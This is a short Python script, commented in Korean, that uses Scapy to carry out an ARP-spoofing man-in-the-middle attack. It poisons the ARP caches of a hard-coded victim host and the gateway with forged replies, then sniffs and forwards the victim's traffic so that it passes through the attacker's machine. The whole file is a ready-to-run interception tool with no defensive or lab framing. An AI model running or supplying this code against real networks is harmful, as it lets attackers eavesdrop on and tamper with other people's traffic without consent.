from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, sendp, sniff
from scapy.config import conf
import threading
import time
import sys

# 1. 환경 설정 (대상 IP와 게이트웨이 IP 수정 필요)
target_ip = "192.168.1.7"
gateway_ip = "192.168.1.1"

# Scapy 로그 최소화
conf.verb = 0 

def get_mac(ip):
    """대상 IP의 MAC 주소를 획득"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None

# MAC 주소 미리 확보
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

if not target_mac or not gateway_mac:
    print("[!] MAC 주소 획득 실패. 호스트가 온라인인지 확인하세요.")
    sys.exit(1)

def spoof():
    """주기적으로 ARP 스푸핑 패킷 전송 (Ether 계층 포함)"""
    print("[*] ARP 스푸핑 시작...")
    while True:
        # 피해자에게: "내가 게이트웨이다"
        pkt1 = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        # 게이트웨이에게: "내가 피해자다"
        pkt2 = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        
        sendp(pkt1, verbose=0)
        sendp(pkt2, verbose=0)
        time.sleep(1.5)

def forward_packet(packet):
    """가로챈 패킷의 MAC 주소를 수정하여 다시 전송"""
    if packet.haslayer(Ether):
        # 피해자 → 게이트웨이 방향
        if packet[Ether].src == target_mac:
            packet[Ether].dst = gateway_mac
            sendp(packet, verbose=0)
        # 게이트웨이 → 피해자 방향
        elif packet[Ether].src == gateway_mac:
            packet[Ether].dst = target_mac
            sendp(packet, verbose=0)

# 2. ARP 스푸핑을 별도 스레드에서 실행
threading.Thread(target=spoof, daemon=True).start()

# 3. 메인 스레드에서 패킷 스니핑 및 포워딩 수행
print(f"[*] MITM 공격 활성화: {target_ip} <-> {gateway_ip}")
print("[*] 트래픽을 가로채고 있습니다. 종료하려면 Ctrl+C를 누르세요.")

try:
    sniff(filter=f"host {target_ip} or host {gateway_ip}", prn=forward_packet, store=0)
except KeyboardInterrupt:
    print("\n[*] 종료 중... ARP 테이블을 복원해야 할 수 있습니다.")
    sys.exit(0)